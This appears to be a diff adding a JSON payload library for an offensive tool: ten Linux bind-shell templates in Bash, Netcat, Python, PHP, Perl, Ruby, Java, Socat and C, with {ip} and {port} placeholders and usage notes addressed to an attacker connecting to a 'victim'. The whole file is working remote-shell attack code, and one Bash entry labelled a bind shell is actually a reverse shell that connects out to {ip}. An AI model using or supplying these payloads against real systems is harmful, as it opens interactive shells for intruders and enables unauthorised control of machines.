@@ -1,0 +1,84 @@
+{
+  "payloads": [
+    {
+      "os": "Linux",
+      "language": "Bash",
+      "description": "Basic Bash bind shell using /dev/tcp and file descriptors.",
+      "template": "bash -i > /dev/tcp/{ip}/{port} 0<&1 2>&1",
+      "usage": "Connect from attacker's machine using: nc {ip} {port}",
+      "tags": ["bind_tcp", "bash", "interactive", "fileless", "one-liner"]
+    },
+    {
+      "os": "Linux",
+      "language": "Netcat",
+      "description": "Netcat bind shell with -e option to bind /bin/bash.",
+      "template": "nc -lvnp {port} -e /bin/bash",
+      "usage": "Attacker connects with: nc {ip} {port}",
+      "tags": ["bind_tcp", "netcat", "interactive", "simple"]
+    },
+    {
+      "os": "Linux",
+      "language": "Netcat",
+      "description": "Netcat bind shell using mkfifo for limited environments.",
+      "template": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvp {port} >/tmp/f",
+      "usage": "Connect to {ip} on port {port} using netcat.",
+      "tags": ["bind_tcp", "netcat", "bash", "fifo", "fileless"]
+    },
+    {
+      "os": "Linux",
+      "language": "Python",
+      "description": "Python bind shell using socket and os.system.",
+      "template": "python -c 'import socket,subprocess,os;s=socket.socket();s.bind((\"{ip}\",{port}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2);subprocess.call([\"/bin/bash\"])'",
+      "usage": "Connect to {ip}:{port} with netcat.",
+      "tags": ["bind_tcp", "python", "interactive", "one-liner"]
+    },
+    {
+      "os": "Linux",
+      "language": "PHP",
+      "description": "PHP bind shell using socket functions to spawn a shell.",
+      "template": "php -r '$sock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($sock,\"{ip}\",{port});socket_listen($sock,1);$client=socket_accept($sock);while(1){$cmd=socket_read($client,2048);$output=shell_exec($cmd);socket_write($client,$output,strlen($output));}'",
+      "usage": "Run the PHP script, then connect with: nc {ip} {port}",
+      "tags": ["bind_tcp", "php", "interactive", "script"]
+    },
+    {
+      "os": "Linux",
+      "language": "Perl",
+      "description": "Perl bind shell using socket and system to execute bash.",
+      "template": "perl -e 'use Socket;$proto=getprotobyname(\"tcp\");socket(S,PF_INET,SOCK_STREAM,$proto);bind(S,sockaddr_in({port},inet_aton(\"{ip}\")));listen(S,SOMAXCONN);for(;accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/bash -i\");}'",
+      "usage": "Use netcat to connect to {ip}:{port}.",
+      "tags": ["bind_tcp", "perl", "interactive", "fileless"]
+    },
+    {
+      "os": "Linux",
+      "language": "Ruby",
+      "description": "Ruby bind shell with TCPServer and /bin/sh exec.",
+      "template": "ruby -rsocket -e 's=TCPServer.new(\"{ip}\",{port});c=s.accept;while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
+      "usage": "Connect to {ip}:{port} using netcat.",
+      "tags": ["bind_tcp", "ruby", "interactive", "script"]
+    },
+    {
+      "os": "Linux",
+      "language": "Java",
+      "description": "Java bind shell using ServerSocket and Runtime.getRuntime().exec().",
+      "template": "public class BindShell { public static void main(String[] args) throws Exception { java.net.ServerSocket server = new java.net.ServerSocket({port}); java.net.Socket socket = server.accept(); Process p = Runtime.getRuntime().exec(\"/bin/bash\"); new Thread(() -> { try { java.io.InputStream in = socket.getInputStream(); java.io.OutputStream out = p.getOutputStream(); byte[] buf = new byte[1024]; int len; while ((len = in.read(buf)) != -1) out.write(buf, 0, len); } catch (Exception e) {} }).start(); java.io.InputStream in = p.getInputStream(); java.io.OutputStream out = socket.getOutputStream(); byte[] buf = new byte[1024]; int len; while ((len = in.read(buf)) != -1) out.write(buf, 0, len); } }",
+      "usage": "Compile and run the class, then connect to {ip}:{port}.",
+      "tags": ["bind_tcp", "java", "compiled", "interactive"]
+    },
+    {
+      "os": "Linux",
+      "language": "Socat",
+      "description": "Socat one-liner bind shell for /bin/bash.",
+      "template": "socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/bash",
+      "usage": "Run the socat command on victim, then connect using socat or nc {ip} {port}",
+      "tags": ["bind_tcp", "socat", "bash", "interactive", "one-liner"]
+    },
+    {
+      "os": "Linux",
+      "language": "C",
+      "description": "C bind shell using socket(), bind(), listen(), and execve().",
+      "template": "#include <stdio.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <unistd.h>\n#include <stdlib.h>\nint main() { int sockfd = socket(AF_INET, SOCK_STREAM, 0); struct sockaddr_in serv_addr; serv_addr.sin_family = AF_INET; serv_addr.sin_addr.s_addr = INADDR_ANY; serv_addr.sin_port = htons({port}); bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)); listen(sockfd, 1); int client = accept(sockfd, NULL, NULL); dup2(client, 0); dup2(client, 1); dup2(client, 2); execl(\"/bin/bash\", \"bash\", NULL); return 0; }",
+      "usage": "Compile and run. Attacker connects using: nc {ip} {port}",
+      "tags": ["bind_tcp", "c", "compiled", "low-level", "interactive"]
+    }
+  ]
+}
